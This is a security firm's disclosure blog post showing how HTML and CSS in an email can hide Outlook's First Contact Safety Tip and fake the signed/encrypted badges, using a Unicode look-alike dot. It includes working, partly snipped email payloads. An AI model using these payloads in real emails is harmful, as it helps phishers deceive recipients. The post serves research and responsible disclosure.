---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-07_exploring-anti-phishing-measures-in-microsoft-365.md
original_filename: 2024-08-07_exploring-anti-phishing-measures-in-microsoft-365.md
title: Exploring Anti-Phishing Measures in Microsoft 365
category: documents
detected_topics:
- command-injection
- automation-abuse
- cloud-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- cloud-security
language: en
raw_sha256: 0eff5a4637abad04e7e4578dfe4b437f56171e25977c16141ce6498c5dc1684d
text_sha256: 1973c0cbba093661bd0eaeb5be78d8ef3f383bced91fd3d34fdb9714bc4175bd
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# Exploring Anti-Phishing Measures in Microsoft 365

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-07_exploring-anti-phishing-measures-in-microsoft-365.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `0eff5a4637abad04e7e4578dfe4b437f56171e25977c16141ce6498c5dc1684d`
- Text SHA256: `1973c0cbba093661bd0eaeb5be78d8ef3f383bced91fd3d34fdb9714bc4175bd`


## Content

---
title: "Exploring Anti-Phishing Measures in Microsoft 365"
page_title: "Exploring Anti-Phishing Measures in Microsoft 365 – Certitude Blog"
url: "https://certitude.consulting/blog/en/o365-anti-phishing-measures/"
final_url: "https://certitude.consulting/blog/en/o365-anti-phishing-measures/"
authors: ["William Moody", "Wolfgang Ettlinger"]
programs: ["Microsoft"]
bugs: ["Phishing"]
publication_date: "2024-08-07"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 89
---

# Exploring Anti-Phishing Measures in Microsoft 365

Written by [William Moody](https://certitude.consulting/blog/en/author/wmo/) on [07.08.202413.02.2025](https://certitude.consulting/blog/en/o365-anti-phishing-measures/)

**In this post we will explore some of the anti-phishing measures employed by Microsoft 365 (formally Office 365) as well as their weaknesses. Cert itude was able to identify an issue in that allows malicious actors to bypass anti-phishing measures.**

When an Outlook user receives an e-mail from an address they don’t typically communicate with, Outlook shows an alert which reads _“You don’t often get email from xyz@example.com. Learn why this is important”_. This is what Microsoft calls the [_First Contact Safety Tip_](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-phishing-policies-about?view=o365-worldwide#first-contact-safety-tip), and it is one of the various anti-phishing measures available in Exchange Online Protection (EOP) and Microsoft Defender to organizations using Office 365:

![](https://certitude.consulting/blog/wp-content/uploads/2024/08/1.png)

The _First Contact Safety Tip_ is prepended to the body of an HTML email, which means it is possible to alter the way it is displayed through the use of CSS style tags.

![](https://certitude.consulting/blog/wp-content/uploads/2024/08/2.webp)

As a proof of concept, let’s demonstrate an HTML email which “hides” the _First Contact Safety Tip_ from the user. Although applying some more common CSS rules such as `display: none`, `height: 0px`, and `opacity: 0` to the table itself doesn’t seem to work (either due to the inline CSS in the elements, or due to lack of support by the rendering engine Outlook uses), it is possible to change the background and font colors to white so that the alert is effectively invisible when rendered to the end user viewing the email:
  
  
  <head>
  </head>
  <head>
  <style>
  a {
  display: none;
  }
  td div {
  color: white;
  font-size: 0px;
  }
  table tbody tr td {
  background-color: white !important;
  color: white !important;
  }
  </style>
  </head>
  
  ...[SNIP]...

By using this HTML code in an e-mail, the alert does not show up in the email body anymore!

![](https://certitude.consulting/blog/wp-content/uploads/2024/08/2025-02-13-11_59_09-Archive-w.moody@certitude.consulting-Outlook-1-1024x315.png)

Note that the e-mail preview (highlighted in red) still begins with the Safety Tip.

## One Step Further

Since we’re already on the topic of phishing, we can take this a step further, and spoof the icons Microsoft Outlook adds to emails that are encrypted and/or signed:
  
  
  ...[SNIP]...
  #mainTable {
  width: 100%;
  z-index: 1;
  margin-bottom: 1em;
  }
  #signedBy {
  font-size: 0.9em;
  }
  .badge {
  width: 2.8em;
  text-align: right;
  }
  </style>
  </head>
  <table id="mainTable">
  <tr>
  <td id="signedBy" style="color:#666 !important;">
  Signed By &nbsp;&nbsp;nimmerrichtermarc@gmail․com
  </td>
  <td class="badge">
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAQCAYAAADAvYV+AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA80lEQVQoFWNgIAEwIqu9u6fn/8uLGxl+fn7JwM4rziBtFsMgb5sOVwNnXFyS/P/Dg9MMYjpeDHwyBgyfnlxgeHVlG5ivGdABV8fw9vah//sb1P4/Obn4P7JNID5I/MvLm2BxJpDkpyfnwWqEVGyR1TIIqzmA+Z+eXgLTYMW/vr4Dc7iEFRDWAUU4BWXB/P9/f4PlGc/OCf8PMxksgoPgkzFkYCJGIUg/SB3YGciGKToVMDg23GIE0egAQ7GMeTxYDYxG1oCh+MnJhWB5GI1X8f19E8DyMBqvYmRJdDYjKIbQBXHxmSQMgnDJoYgr2Gej8AlyAAq1UqzJ9H01AAAAAElFTkSuQmCC"/>
  </td>
  <td class="badge">
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAQCAYAAAArij59AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABaklEQVQoFWNkAILfb1/+f7mon+HbjQsMjExMDJwaBgziMfkMrMLijIw/Ht/9/6AmkeHfty8gtXDAzCfIoNSzkoE5XYq14eeDWwysYtIM0rktDHxWbgzfb15k+PP+DRC/ZmD6eukkWJd4QjEDr7EtI5+pA6NYXCFYDCTHxAC0Ewz+/YPQSCTIPSw8ehYMn07sYXi5oIfh3c7V////+c3wcl4XWBmPkS0D48+nD4COTGD4++UTkl4GBhYBYbAjGUGiIG++WjYF7k0uLWMGsagcBhZ+IUaGPx/f/f+wf9P/Xy+e/IcZ8fPJ/f/v96z7//fr5/+Mn04f+P+kqwgmh0LLN81lYPrz5gWKIDLn96unDEw/nz1EFkNh/wZqhpvAyMbOIFPWxyBd0M7AyMIKVvjrxWMGFhABEgBJgEIRJPPx6M7/TydVM/x+9YyB4Uaszf+Ph7fDfQCzAxRot7N9/zO83bwYQxKm6NXyqf8BbdGbs1P6sYsAAAAASUVORK5CYII="/>
  </td>
  </tr>
  </table>

![](https://certitude.consulting/blog/wp-content/uploads/2024/08/result-1024x221.webp)

One thing to note here is that the _‘.’_ character in _‘Signed By nimmerrichtermarc@gmail.com’_ is actually the Unicode character [U+2024](https://www.compart.com/de/unicode/U+2024), and not a regular period. This is because when left as a period, Outlook will automatically detect _nimmerrichtermarc@gmail.com_ as an email address and generate a _mailto_ link, which would look noticeably different from the original text we are trying to spoof.

When compared to an email which is actually signed and encrypted, more attentive users will of course notice a difference in formatting, however some users will not. It only takes one person to fall for the phishing attack for an adversary to gain a foothold in the organization!

## Responsible Disclosure

After developing a proof of concept, and preparing an advisory, we made Microsoft aware of these issues through the Microsoft Researcher Portal (MSRC). Microsoft chose to not address this behavior for now:

> We determined your finding is valid but does not meet our bar for immediate servicing considering this is mainly applicable for phishing attacks. However, we have still marked your finding for future review as an opportunity to improve our products.
> 
> Microsoft MSRC, 14.02.2024

## Authors

This research was conducted by William Moody and Wolfgang Ettlinger.
